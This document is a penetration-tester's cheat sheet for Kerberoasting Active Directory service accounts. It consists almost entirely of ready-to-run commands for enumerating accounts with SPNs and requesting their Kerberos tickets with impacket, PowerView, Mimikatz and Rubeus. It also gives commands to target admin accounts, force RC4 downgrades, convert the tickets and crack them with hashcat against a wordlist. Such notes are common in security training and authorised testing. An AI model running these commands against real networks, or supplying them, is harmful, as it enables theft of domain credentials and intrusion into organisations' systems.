---
tags:
  - Authenticated
  - Kerberos
  - AD
---
## Identify
---
**Windows**
AD Module in powershell
```PowerShell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
Using Powerview
```PowerShell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```
Living off the land
```PowerShell
setspn.exe -Q */*
```
Using Rubeus
```Python
.\Rubeus.exe kerberoast /stats
```
**Linux**
```PowerShell
impacket-GetUserSPNs -dc-ip <dcip> domain.local/username
```
  
## Exploit
---
**From Linux**
```PowerShell
impacket-GetUserSPNs -dc-ip <dcip> domain.local/username -request
```
```PowerShell
impacket-GetUserSPNs -dc-ip <dcip> domain.local/username -request-user
```
you can also use `-outputfile <name>`

**Crack hash**
```PowerShell
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
**From Windows**
- Semi-manual approach 

```Bash
setspn.exe -Q */*
```

```Bash
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.domain.local:1433"
```

```Bash
mimikatz # base64 /out:true
mimikatz # kerberos::list /export  
```

```Bash
echo "<base64 blob>" |  tr -d \\n 
```

```Bash
cat encoded_file | base64 -d > sqldev.kirbi
```

```Python
python2.7 kirbi2john.py sqldev.kirbi
```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

```Python
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Crack the file

```Python
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

!!! info "note"
	If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.

  

**PowerView**
```Python
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```
```Python
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
```Python
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```
**Rubeus**
List info about kerberoastable accounts
```Python
.\Rubeus.exe kerberoast /stats
```
target admin acccounts
```Python
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
use tgt delegation to force RC4 downgrade of tickets. (Doesn't work on >= Win 2019)
```Python
.\Rubeus.exe kerberoast /tgtdeleg /nowrap
```
